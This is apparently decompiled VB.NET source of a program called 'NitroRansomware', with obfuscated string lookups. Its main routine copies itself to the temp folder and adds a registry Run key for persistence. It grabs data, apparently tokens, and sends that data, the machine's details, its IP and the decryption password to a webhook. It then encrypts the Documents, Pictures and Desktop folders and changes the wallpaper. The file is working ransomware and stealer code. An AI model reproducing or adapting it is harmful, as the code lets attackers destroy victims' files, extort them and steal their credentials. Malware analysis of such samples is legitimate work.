Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports dg3ypDAonQcOidMs0w
Imports Microsoft.Win32
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x02000007 RID: 7
	Friend Class Program
		' Token: 0x06000023 RID: 35 RVA: 0x00004764 File Offset: 0x00002964
		Private Shared Sub Main(args As String())
			If Program.Installed() Then
				Application.Run(New Form1())
			Else
				Program.Duplicate()
				Program.StartUp()
				Program.Setup()
				Program.EncryptAll()
				Program.Temp()
				Thread.Sleep(6000)
				Application.Run(New Form1())
			End If
		End Sub

		' Token: 0x06000024 RID: 36 RVA: 0x000047B4 File Offset: 0x000029B4
		Private Shared Sub Setup()
			Program.logging.Debug(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4176))
			Dim list As List(Of String) = Grabber.Grab()
			Dim text As String = ""
			For Each text2 As String In list
				text = text + text2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3916)
			Next
			Console.WriteLine(text)
			Dim details As List(Of String) = User.GetDetails()
			Dim identifier As String = User.GetIdentifier()
			Dim ip As String = User.GetIP()
			Dim webhook As Webhook = New Webhook(Program.WEBHOOK)
			webhook.Send(String.Concat(New String() { WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4202), details(0), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4304), details(1), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4320), identifier, WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4338), ip, WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4368) }))
			webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4378) + Program.DECRYPT_PASSWORD + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4368))
			webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4420) + text + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4368))
		End Sub

		' Token: 0x06000025 RID: 37 RVA: 0x00004910 File Offset: 0x00002B10
		Public Shared Sub EncryptAll()
			Program.ww.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4446))
			Dim <>9__9_ As ThreadStart = Program.<>c.<>9__9_0
			Dim threadStart As ThreadStart = <>9__9_
			If <>9__9_ Is Nothing Then
				Dim threadStart2 As ThreadStart = Sub()
					Crypto.EncryptContent(Program.documents)
				End Sub
				threadStart = threadStart2
				Program.<>c.<>9__9_0 = threadStart2
			End If
			Dim thread As Thread = New Thread(threadStart)
			Dim <>9__9_2 As ThreadStart = Program.<>c.<>9__9_1
			Dim threadStart3 As ThreadStart = <>9__9_2
			If <>9__9_2 Is Nothing Then
				Dim threadStart4 As ThreadStart = Sub()
					Crypto.EncryptContent(Program.pictures)
				End Sub
				threadStart3 = threadStart4
				Program.<>c.<>9__9_1 = threadStart4
			End If
			Dim thread2 As Thread = New Thread(threadStart3)
			Dim <>9__9_3 As ThreadStart = Program.<>c.<>9__9_2
			Dim threadStart5 As ThreadStart = <>9__9_3
			If <>9__9_3 Is Nothing Then
				Dim threadStart6 As ThreadStart = Sub()
					Crypto.EncryptContent(Program.desktop)
				End Sub
				threadStart5 = threadStart6
				Program.<>c.<>9__9_2 = threadStart6
			End If
			Dim thread3 As Thread = New Thread(threadStart5)
			thread.Start()
			thread2.Start()
			thread3.Start()
			thread.Join()
			thread2.Join()
			thread3.Join()
			Program.ww.Send(String.Format(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4514), Crypto.encryptedFileLog.Count))
			Wallpaper.ChangeWallpaper()
		End Sub

		' Token: 0x06000026 RID: 38 RVA: 0x000049F4 File Offset: 0x00002BF4
		Public Shared Sub DecryptAll()
			Dim <>9__10_ As ThreadStart = Program.<>c.<>9__10_0
			Dim threadStart As ThreadStart = <>9__10_
			If <>9__10_ Is Nothing Then
				Dim threadStart2 As ThreadStart = Sub()
					Crypto.DecryptContent(Program.documents)
				End Sub
				threadStart = threadStart2
				Program.<>c.<>9__10_0 = threadStart2
			End If
			Dim thread As Thread = New Thread(threadStart)
			Dim <>9__10_2 As ThreadStart = Program.<>c.<>9__10_1
			Dim threadStart3 As ThreadStart = <>9__10_2
			If <>9__10_2 Is Nothing Then
				Dim threadStart4 As ThreadStart = Sub()
					Crypto.DecryptContent(Program.pictures)
				End Sub
				threadStart3 = threadStart4
				Program.<>c.<>9__10_1 = threadStart4
			End If
			Dim thread2 As Thread = New Thread(threadStart3)
			Dim <>9__10_3 As ThreadStart = Program.<>c.<>9__10_2
			Dim threadStart5 As ThreadStart = <>9__10_3
			If <>9__10_3 Is Nothing Then
				Dim threadStart6 As ThreadStart = Sub()
					Crypto.DecryptContent(Program.desktop)
				End Sub
				threadStart5 = threadStart6
				Program.<>c.<>9__10_2 = threadStart6
			End If
			Dim thread3 As Thread = New Thread(threadStart5)
			thread.Start()
			thread2.Start()
			thread3.Start()
			thread.Join()
			thread2.Join()
			thread3.Join()
		End Sub

		' Token: 0x06000027 RID: 39 RVA: 0x00004A94 File Offset: 0x00002C94
		Private Shared Sub StartUp()
			Try
				Dim text As String = Process.GetCurrentProcess().ProcessName + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4674)
				Dim text2 As String = Path.GetTempPath() + text
				Console.WriteLine(text2)
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4686), True)
					registryKey.SetValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4788) + text2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4788))
				End Using
			Catch ex As Exception
				Program.logging.[Error](ex.Message)
			End Try
		End Sub

		' Token: 0x06000028 RID: 40 RVA: 0x00004B4C File Offset: 0x00002D4C
		Public Shared Sub RemoveStart()
			If Registry.GetValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4794), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), True) IsNot Nothing Then
				Using registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4686), True)
					registryKey.DeleteValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), False)
				End Using
			End If
		End Sub

		' Token: 0x06000029 RID: 41 RVA: 0x00004BC0 File Offset: 0x00002DC0
		Private Shared Sub Duplicate()
			Try
				Dim text As String = Process.GetCurrentProcess().ProcessName + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4674)
				Dim text2 As String = Path.Combine(Environment.CurrentDirectory, text)
				File.Copy(text2, Path.GetTempPath() + text)
				Console.WriteLine(Path.GetTempPath())
			Catch ex As Exception
				Program.logging.Debug(ex.Message)
			End Try
		End Sub

		' Token: 0x0600002A RID: 42 RVA: 0x00004C34 File Offset: 0x00002E34
		Private Shared Function Installed() As Boolean
			Return Registry.GetValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4794), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), Nothing) IsNot Nothing
		End Function

		' Token: 0x0600002B RID: 43 RVA: 0x00004C68 File Offset: 0x00002E68
		Private Shared Sub Temp()
			Dim text As String = Path.GetTempPath() + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4926)
			Console.WriteLine(text)
			Using streamWriter As StreamWriter = New StreamWriter(text)
				streamWriter.WriteLine(Program.DECRYPT_PASSWORD)
			End Using
		End Sub

		' Token: 0x0600002C RID: 44 RVA: 0x00002243 File Offset: 0x00000443
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
		End Sub

		' Token: 0x0600002D RID: 45 RVA: 0x00004CC0 File Offset: 0x00002EC0
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			Program.desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
			Program.documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal)
			Program.pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
			Program.WEBHOOK = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4958)
			Program.DECRYPT_PASSWORD = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5202)
			Program.logging = New Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0)
			Program.ww = New Webhook(Program.WEBHOOK)
		End Sub

		' Token: 0x04000027 RID: 39
		Private Shared desktop As String

		' Token: 0x04000028 RID: 40
		Private Shared documents As String

		' Token: 0x04000029 RID: 41
		Private Shared pictures As String

		' Token: 0x0400002A RID: 42
		Public Shared WEBHOOK As String

		' Token: 0x0400002B RID: 43
		Public Shared DECRYPT_PASSWORD As String

		' Token: 0x0400002C RID: 44
		Private Shared logging As Logs

		' Token: 0x0400002D RID: 45
		Private Shared ww As Webhook
	End Class
End Namespace
